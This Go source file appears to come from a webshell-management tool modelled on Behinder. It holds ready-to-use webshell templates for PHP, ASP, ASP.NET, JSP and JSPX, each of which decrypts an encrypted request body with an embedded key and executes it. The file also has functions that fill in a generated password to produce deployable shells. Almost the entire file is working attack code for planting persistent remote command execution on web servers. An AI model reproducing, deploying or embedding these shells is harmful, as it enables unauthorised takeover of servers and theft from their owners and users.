package behinder

import (
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/utils"
	"strings"
)

const (
	pwd                 = "{{PWD}}"
	phpShellTemplate    = "<?php @error_reporting(0);session_start(); $key=\"{{PWD}}\"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {     $post[$i] = $post[$i]^$key[$i+1&15];     }}else{$post=openssl_decrypt($post, \"AES128\", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params);?>"
	aspShellTemplate    = "<% Response.CharSet = \"UTF-8\"  k=\"{{PWD}}\"  Session(\"k\")=k size=Request.TotalBytes content=Request.BinaryRead(size) For i=1 To size result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) Next execute(result) %>"
	csharpShellTemplate = "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"{{PWD}}\"); byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%> "
	jspShellTemplate    = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"{{PWD}}\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
	jspXShellTemplate   = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k=\"{{PWD}}\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>"
)

func GenRandShell(scriptType shell.ScriptType) (pass string, shell string) {
	pass = utils.RandomRangeString(6, 12)
	return pass, genShell(pass, scriptType)
}

func GenAssignShell(pass string, scriptType shell.ScriptType) string {
	return genShell(pass, scriptType)
}

func genShell(pass string, scriptType shell.ScriptType) string {
	var content string
	pass = string(utils.SecretKey(pass))
	switch scriptType {
	case shell.AspScript:
		content = strings.ReplaceAll(aspShellTemplate, pwd, pass)
	case shell.CsharpScript:
		content = strings.ReplaceAll(csharpShellTemplate, pwd, pass)
	case shell.PhpScript:
		content = strings.ReplaceAll(phpShellTemplate, pwd, pass)
	case shell.JavaScript:
		content = strings.ReplaceAll(jspShellTemplate, pwd, pass)
	case shell.JspxScript:
		content = strings.ReplaceAll(jspXShellTemplate, pwd, pass)
	}
	return content
}
